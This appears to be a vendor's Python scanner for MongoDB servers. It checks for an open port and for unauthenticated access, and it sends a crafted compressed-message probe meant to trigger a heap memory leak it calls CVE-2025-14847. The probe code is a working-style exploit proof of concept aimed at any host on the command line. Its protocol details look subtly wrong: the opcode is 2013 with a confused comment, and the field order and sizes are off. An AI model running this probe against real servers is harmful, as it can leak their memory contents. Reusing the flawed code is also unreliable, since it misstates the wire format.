import argparse
import socket
import struct
import zlib
import pymongo
from pymongo.errors import ConnectionFailure

# Proprietary License - CyberDudeBivash Pvt Ltd 2026
# For premium features: https://www.cyberdudebivash.com/apps-products

def check_open_port(target, port=27017):
    """Check if MongoDB port is open."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def check_unauth_access(target, port=27017):
    """Attempt unauthenticated connection."""
    try:
        client = pymongo.MongoClient(f"mongodb://{target}:{port}/", serverSelectionTimeoutMS=3000)
        client.list_database_names()
        client.close()
        return True
    except (ConnectionFailure, pymongo.errors.OperationFailure):
        return False
    except Exception:
        return False

def check_mongobleed_vuln(target, port=27017):
    """PoC for CVE-2025-14847 heap leak via OP_COMPRESSED."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        
        # Craft small compressed payload
        payload = b'hello world' * 2  # Small data
        compressed = zlib.compress(payload)
        
        # OP_COMPRESSED header: Fake large uncompressedSize (64KB)
        msg_header = struct.pack("<iiiii", 16 + len(compressed) + 4, 1, 0, 2013, 0)  # OP_COMPRESSED=2012+1
        compressor_id = struct.pack("<i", 1)  # zlib
        uncompressed_size = struct.pack("<i", 65536)  # Fake large size
        
        full_msg = msg_header + compressor_id + uncompressed_size + compressed
        sock.send(full_msg)
        
        response = sock.recv(65536)
        sock.close()
        
        # Vulnerable if response length matches fake size (oversized with heap junk)
        if len(response) >= 65536 - len(payload):
            return True, "Potential heap leak detected (oversized response)"
        return False, "No leak observed"
    except Exception as e:
        return False, str(e)

def run_scan(target, port=27017, verbose=False):
    report = {"target": f"{target}:{port}", "vulnerabilities": []}
    
    if check_open_port(target, port):
        report["port_open"] = True
        if verbose: print(f"[+] Port {port} open on {target}")
        
        if check_unauth_access(target, port):
            report["vulnerabilities"].append("Unauthenticated access possible")
            if verbose: print("[!] Unauthenticated access detected")
        
        vuln, msg = check_mongobleed_vuln(target, port)
        if vuln:
            report["vulnerabilities"].append(f"CVE-2025-14847 vulnerable: {msg}")
            if verbose: print(f"[!] CVE-2025-14847 detected: {msg}")
        else:
            if verbose: print(f"[-] Not vulnerable to CVE-2025-14847: {msg}")
    else:
        report["port_open"] = False
        if verbose: print(f"[-] Port {port} closed on {target}")
    
    return report

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CYBERDUDEBIVASH MongoDB Detector v2026.1")
    parser.add_argument("--target", required=True, help="Target IP/hostname")
    parser.add_argument("--port", type=int, default=27017, help="MongoDB port")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    report = run_scan(args.target, args.port, args.verbose)
    
    print("\nScan Report:")
    print(report)
    print("\nMitigation: Secure MongoDB - Enable auth, bind to localhost, patch CVE-2025-14847.")
    print("Premium version with multi-target scanning: https://www.cyberdudebivash.com/apps-products/")